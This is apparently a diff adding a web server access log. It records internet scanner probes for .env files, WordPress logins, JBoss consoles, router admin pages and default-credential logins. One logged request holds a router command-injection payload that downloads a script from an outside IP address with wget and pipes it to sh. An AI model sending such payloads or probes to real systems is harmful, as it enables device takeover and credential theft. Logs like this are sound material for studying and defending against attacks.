+INFO:     127.0.0.1:42544 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:60392 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60810 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60812 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60818 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:60832 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47200 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60596 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60598 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:54642 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44650 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46064 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54044 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:37198 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:37212 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48524 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48526 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:56192 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56202 - "GET /form.html HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:56214 - "GET /upl.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:56228 - "GET /t4 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:56230 - "GET /geoip/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:56244 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:56250 - "GET /1.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:56256 - "GET /systembc/password.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:56258 - "GET /password.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:53406 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:44972 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59746 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:37330 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60446 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60460 - "POST /HNAP1/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:45914 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:46428 - "GET /wp-login.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48262 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:48274 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:50968 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:49702 - "GET /wp-login.php HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:43852 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39500 - "GET /cgi-bin/luci/%3Bstok%3D/locale HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:38192 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:38194 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:39462 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:37630 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:55492 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:32996 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:35694 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33998 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:49384 - "GET /cgi-bin/luci/%3Bstok%3D/locale HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:33310 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:41676 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:41686 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:43766 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34838 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:34840 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:51660 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34638 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45390 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:36952 - "HEAD /invoker/EJBInvokerServlet HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36962 - "HEAD /jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:36978 - "HEAD /invoker/JMXInvokerServlet HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:56662 - "HEAD /web-console/ServerInfo.jsp HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:34364 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:35926 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.19.99%2Ft%7Csh%3B%60) HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46126 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47764 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39184 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:39200 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:43016 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54342 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37634 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:58552 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47064 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:56110 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59898 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42752 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:51904 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:54462 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:45532 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:47286 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47302 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:59320 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60860 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:39826 - "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:52270 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42232 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:33086 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:33088 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:35234 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:35408 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:59328 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:34954 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:34964 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     127.0.0.1:43492 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:40390 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52218 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55458 - "GET /cgi-bin/luci/%3Bstok%3D/locale HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:47784 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:51564 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:53678 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:55660 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:52324 - "GET /webui/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:55774 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37560 - "GET /geoserver/web/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:58554 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:60168 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:42548 - "GET / HTTP/1.1" 200 OK
+INFO:     127.0.0.1:37002 - "POST /V1/restaurantUser/restaurant_login HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:37016 - "POST /V1/restaurantUser/restaurant_login HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:43868 - "GET /V1/Home HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:58766 - "GET /V1 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:55482 - "GET /api/ HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:46520 - "GET /api/ HTTP/1.1" 200 OK
